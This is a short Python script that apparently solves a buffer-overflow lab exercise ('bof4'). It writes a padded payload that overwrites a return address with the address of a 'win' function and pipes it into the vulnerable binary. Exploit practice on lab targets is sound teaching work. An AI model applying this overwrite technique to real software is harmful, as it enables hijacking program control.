#!/usr/bin/python3
import sys
import subprocess

path = '/home/kribas/Software-Security-Lab/bof-exercise-2/bof4'
infile = f'{path}/input.txt'
vuln = f'{path}/bof4'

buff_len = 0x18
win_addr = b'\xa6\x91\x04\x08'
buffer = b'A'*buff_len +b'BBBB' + win_addr

with open(infile,'wb') as f:
	f.write(buffer)
	f.close()

with open(infile,'rb') as f:
	prog = subprocess.run(['/home/kribas/Software-Security-Lab/bof-exercise-2/bof4/bof4'],stdout=subprocess.PIPE,stdin=f)
	print(prog.stdout)
	sys.stdout.buffer.write(prog.stdout)
	f.close()
